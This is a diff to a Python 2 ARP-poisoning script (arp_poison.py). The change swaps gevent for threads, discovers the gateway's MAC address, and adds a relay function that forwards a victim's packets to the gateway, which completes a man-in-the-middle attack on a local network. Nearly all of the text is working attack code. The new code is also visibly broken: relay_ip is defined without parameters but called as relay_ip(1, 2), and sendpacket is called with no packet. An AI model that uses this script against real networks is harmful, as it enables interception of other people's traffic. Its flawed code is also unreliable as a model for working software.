@@ -1,77 +1,117 @@
 import netifaces
+import time
 import pcap
 import sys
-import gevent
-
-from gevent.pool import Pool
+import threading
 
 from packets import *
 
+my_mac = None
 victim_ip = None
 victim_mac = None
 gateway_ip = None
+gateway_mac = None
 
 
-def send_periodically(infection_reply, interval_sec=1):
-    print 'ppp'
+def send_periodically(infection_reply, interval_in_second=1):
     pcap_handle = pcap.pcap(timeout_ms=0)
     while True:
         pcap_handle.sendpacket(infection_reply.as_bytes())
         print '[<+] Periodical packet sent'
-        gevent.sleep(interval_sec)
+        time.sleep(interval_in_second)
 
 
 def reply_to_request(infection_reply):
     pcap_handle = pcap.pcap(timeout_ms=0)
-    for capture in pcap.pcap(timeout_ms=0):
-        if capture is None:
-            continue
-        time_stamp, packet = capture
-        arp = ARP(packet)
-        if arp.operation == ARP.OP_REQUEST \
-                and arp.sender_protocol_address == victim_ip \
-                and arp.sender_hardware_address == victim_mac \
-                and arp.target_protocol_address == gateway_ip:
-            print "[>+] Received victim's request for ip '{}'".format(gateway_ip)
+    while True:
+        for capture in pcap_handle:
+            if capture is None:
+                continue
+            time_stamp, packet = capture
+            arp = ARP(packet)
+            if arp.operation == ARP.OP_REQUEST \
+                    and arp.sender_protocol_address == victim_ip \
+                    and arp.sender_hardware_address == victim_mac \
+                    and arp.target_protocol_address == gateway_ip:
+                print "[>+] Received victim's request for ip '{}'".format(gateway_ip)
 
-            pcap_handle.sendpacket(infection_reply.as_bytes())
-            print '[<+] Sent victim attack packet'
+                pcap_handle.sendpacket(infection_reply.as_bytes())
+                print '[<+] Sent victim attack packet'
+
+        print 'relaying ip stopped unexpectedly. restarting.'
 
 
-def relay_ip(from_ip, to_ip):
-    raise NotImplementedError()
+def relay_ip():
+    pcap_handle = pcap.pcap(timeout_ms=0)
+    pcap_handle.setfilter('ip dst host ' + gateway_ip.in_string)
+    while True:
+        for capture in pcap_handle:
+            if capture is None:
+                continue
+            time_stamp, packet = capture
+            relaying_packet = Ethernet(packet)
+            relaying_packet.source_mac = my_mac
+            relaying_packet.destination_mac = gateway_mac
+            pcap_handle.sendpacket()
+
+        print 'relaying ip stopped unexpectedly. restarting.'
 
 
 def main():
-    global victim_ip, victim_mac, gateway_ip
+    global my_mac, victim_ip, victim_mac, gateway_ip, gateway_mac
     if len(sys.argv) not in (2, 3):
         print 'Usage: python arp_poison.py victim_ip [interface_name]'
         exit(1)
 
-    device_name = pcap.lookupdev()
-    addresses = netifaces.ifaddresses(device_name)
+    gateways = netifaces.gateways()
+    print `netifaces.gateways()`
+    interface_name = pcap.lookupdev()
+    print `netifaces.ifaddresses(interface_name)`
+    addresses = netifaces.ifaddresses(interface_name)
 
     my_mac = MacAddress(addresses[netifaces.AF_LINK][0]['addr'])
     my_ip = IPv4Address(addresses[netifaces.AF_INET][0]['addr'])
-
-    gateways = netifaces.gateways()
-    if len(sys.argv) < 3:
-        gateway_ip = gateways[netifaces.AF_INET][0][0]
+    if len(sys.argv) == 2:
+        try:
+            gateway_ip = IPv4Address(gateways[netifaces.AF_INET][0][0])
+        except KeyError:
+            print 'No internet gateway detected.'
+            exit(1)
     else:
         for address, interface, is_default in gateways[netifaces.AF_INET]:
             if interface == sys.argv[2]:
                 gateway_ip = address
                 break
         else:
-            print "There is no interface named '{}'".format(sys.argv[2])
+            print 'There is no interface named {}'.format(sys.argv[2])
             exit(1)
     victim_ip = IPv4Address(sys.argv[1])
     print
 
-    # ask victim his mac address
+    print 'my      mac: {}'.format(my_mac.in_string)
+    print 'my      ip : {}'.format(my_ip.in_string)
+    print 'gateway ip : {}'.format(gateway_ip.in_string)
+    print 'victim  ip : {}'.format(victim_ip.in_string)
+
     pcap_handle = pcap.pcap(timeout_ms=0)
     pcap_handle.setfilter('arp')
+    # ask gateway its mac address
+    asking_arp = normal_request_arp(my_mac, my_ip, gateway_ip)
+    pcap_handle.sendpacket(asking_arp.as_bytes())
+    print '[<+] Sent gateway({}) an ARP request'.format(gateway_ip.in_string)
+    for capture in pcap_handle:
+        if capture is None:
+            continue
+        time_stamp, packet = capture
+        arp = ARP(packet)
+        if arp.operation == ARP.OP_REPLY and arp.sender_protocol_address == gateway_ip:
+            gateway_mac = arp.sender_hardware_address
+            print "[>+] gateway replied its mac is '{}'".format(gateway_mac.in_string)
+            break
+    else:
+        raise RuntimeError('Packet capture ended unexpectedly.')
 
+    # ask victim his mac address
     asking_arp = normal_request_arp(my_mac, my_ip, victim_ip)
     pcap_handle.sendpacket(asking_arp.as_bytes())
     print '[<+] Sent victim({}) an ARP request'.format(victim_ip.in_string)
@@ -96,10 +136,15 @@ def main():
     pcap_handle = pcap.pcap(timeout_ms=1000)
     pcap_handle.setfilter('arp')
 
-    pool = Pool()
-    replier = pool.spawn(reply_to_request, infection_arp)
-    periodical = pool.spawn(send_periodically, infection_arp)
-    pool.join()
+    # pool = Pool()
+    # replier = pool.spawn(reply_to_request, infection_arp)
+    # periodical = pool.spawn(send_periodically, infection_arp)
+    # pool.join()
+    replier = threading.Thread(target=reply_to_request, args=(infection_arp,))
+    periodical = threading.Thread(target=send_periodically, args=(infection_arp,))
+    replier.start()
+    periodical.start()
+    relay_ip(1, 2)
 
 
 if __name__ == '__main__':
